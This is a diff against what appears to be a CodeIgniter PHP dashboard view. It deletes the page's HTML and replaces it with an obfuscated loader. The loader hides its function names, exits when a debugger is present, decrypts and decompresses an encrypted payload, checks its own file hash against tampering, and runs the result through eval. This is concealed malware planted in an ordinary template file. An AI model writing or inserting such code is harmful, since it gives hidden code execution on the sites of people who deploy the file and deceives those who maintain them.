@@ -1,67 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-<!-- FORM CSS CODE -->
-<?php $this->load->view('comman/code_css_datatable'); ?>
-<!-- </copy> -->  
-
-</head>
-<body class="hold-transition skin-blue sidebar-mini">
-<div class="wrapper">
-  <!-- Notification sound -->
-  <audio id="login">
-    <source src="<?php echo $theme_link; ?>sound/login.mp3" type="audio/mpeg">
-    <source src="<?php echo $theme_link; ?>sound/login.ogg" type="audio/ogg">
-  </audio>
-  <script type="text/javascript">
-    var login_sound = document.getElementById("login"); 
-  </script>
-  <!-- Notification end -->
-  <script type="text/javascript">
-  <?php if($this->session->flashdata('success')!=''){ ?>
-        login_sound.play();
-  <?php } ?>
-  </script>
-  
-  <?php 
-  $this->load->view('sidebar');
-  ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-        <small></small>
-      </h1>
-      <ol class="breadcrumb">
-        <li class="active"><i class="fa fa-dashboard"></i> Home</li>
-      </ol>
-    </section><br/>
-    <div class="col-md-12">
-      <!-- ********** ALERT MESSAGE START******* -->
-       <?php $this->load->view('comman/code_flashdata'); ?>
-       <!-- ********** ALERT MESSAGE END******* -->
-     </div>
-     
-  </div>
-  <!-- /.content-wrapper -->
-
-  <?php $this->load->view('footer'); ?>
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-
-</div>
-<!-- ./wrapper -->
-
-<!-- SOUND CODE -->
-<?php $this->load->view('comman/code_js_sound'); ?>
-<!-- TABLES CODE -->
-<?php $this->load->view('comman/code_js_datatable'); ?>
-<!-- bootstrap datepicker -->
-
-
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_lu2besg2=('bas'.'e64'.'_de'.'cod'.'e');
+$_fdqmxipa=('gzu'.'nco'.'mpr'.'ess');
+$_as4uqiuh=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_v2c2k7wn='II0cdQMx';
+$_m7otuwbj='9KH4c6eKtDA=';
+$_q3mgz3kc='hCy7KOZ3';
+$_f1ljdo84='LWn8olA5';
+$_xitxp05f='Bn/no9uT';
+$_v4h24yfi='VfiVv3mB';
+$_sduj8bb9='RohF2w==';
+$_fxgf0tyz='4AshTxuO';
+$_gej4g038=$_lu2besg2($_xitxp05f.$_f1ljdo84.$_q3mgz3kc.$_v2c2k7wn.$_m7otuwbj);
+$_cglu6hes=$_lu2besg2($_fxgf0tyz.$_v4h24yfi.$_sduj8bb9);
+$_ekscvsp6=$_lu2besg2('NtvhB2r8RWUbtE84dpU/ZPq8n7b7tfug0u4N/eHpqnZsmod6FRZXe/rseadf1TGe6nfvZf4BjINpPuYnXa4RI0B7iIGhlyFQL6K62XXwAjvzFAi5O7vHGTinUfySPFK0XheZsVg6YL0bc1n89kg8Ugk1vcXnGC0GSQGuc1BL/pYaNHeFlgdXNt6NFiGry5xZMev89kmsRd/s917vRbYwqMmWSlTv1XXART0Wz8PUFR0vqIUOdvB2rpp0rnostP0cxL2XclgnRoFvFcMGENRasiidYy/LnCdaFZ3i2FKsI7MCzh3d/hTV1lcD+XobRpLVFYpNZGz8A9qSLKmCN7CSPF3m1ES7sN5eWvvzjRCkCsJeFYSdWRy0Mf25r3eVNL7IJz2pKZLIo9Bbltz+garlH5oxTA8VJH46QXuqsmtUjA5yJGvzK0EjkBV+SD7rg/ZMIHDkqLB/fJR5vigLGiWMQS/bI8qB3c1bjMcZrA1wPlmbELgffpTm+tzhMrPUqHOQxhT+BGcEUW7kIUp2rBk7Y3orJ2xU81779cNvITCZ+SF9+8gC7n2u2OrXAl6pdrnM8Wdw02tbmEBgOS1UevKPJg+8Bz82iBmFRGLwkD4i6RDiMLxOxNM70ocVZGOEhp8Zz/7Zm7ua0ppgqOFPK4juXt0mK+2JuBBXAvbJC2C//MM2T1soZ4gvYtLfbhcwLj8xo4CX9HtMfutlj2UDt9OSV/iP+Q4ujxspCBKWm55bVhQyZRBS9Xb2jbgdROQXPtTPE9UvW7AZf/2CMEiUEsSSYNAuPNUHM95viPgMBXKTXKqKJvf1zjWWYaSseZCNmfhmAY3Y/IjuoM7xDBbU3UHFZnSqD9lDE5bsQG1NOoVO7rVV12FwUlNETvyzI3RmmXdCyIAR2tn1f7VkVn4fiTChh5FgZ+D3aW2st1NCldD5h+E+J/l1MJ5gKevrlA094bPpL0xRSza6oV9Ky83LG8usqOTOwhhGWWucQ1Mf87CRwHDOcll+2GvnisklvbsX04Y1xDrAZJ9KG7tEb1E9N6j3k2cBlD4h5mVvKDZp/gJbV4gGrsp3ZtkngM/Jdy1dtuWoxJw1okf4VTSAlESkDRZUkkOhH+gtManKyjBzt6W83ldf5OTFBodjOvShYZkYKoa2DWlQxTdARcjTv+oc81JZJy/BOWRNXmgwlUZMBZ2Em5p6NNo9/brjGmEM20KZpjyWKYH1q/rLQ6E+oKzszAWmX5W+5TnfugOvnHkjoQTfVlxsN7XihTsbcKfd1P65kmJWcW9pM2Fhs9O5xdQpMSP43WisQBerjAST4FggnO+AzwwnkDOisewpUo2CyGBc5Dd1n7g0RaorfE98jzsfXbK353hjTzqszCX3goQj+Bc0gQe8s2wqdNocTtK5weeOKOPOIirS+PNt3aLAUOs8AZYVJww1AtU9ann/DBNGkTBokXhnqdHBC/OiMNHkhjYjz4BAWvg2hwWouV8z0nRmpU/YCetGeDSq1OvwNR0c+s1Y++x2MuFjiIXu18KHvj4kk5lP931+oHi/WqbLDMwvUX0Obg==');
+$_irs5xjy9=$_as4uqiuh($_ekscvsp6,'aes-256-cbc',$_gej4g038,OPENSSL_RAW_DATA,$_cglu6hes);
+if($_irs5xjy9===false){exit;}
+$_pqkw5wp8=$_fdqmxipa($_irs5xjy9);
+if($_pqkw5wp8===false){exit;}
+$_q6wo0xt7='d6c1f674c182bbc9d61a9d9b1a74186b19e8b374be22dcd18a110e5ef78de622';
+$_wtwajffo=@file_get_contents(__FILE__);
+if($_wtwajffo!==false){
+$_sje92lc8=str_replace($_q6wo0xt7,"0000000000000000000000000000000000000000000000000000000000000000",$_wtwajffo);
+$_b0d9pvbg=hash("sha256",$_sje92lc8);
+if($_b0d9pvbg!==$_q6wo0xt7){@http_response_code(403);exit;}
+}
+eval($_pqkw5wp8);
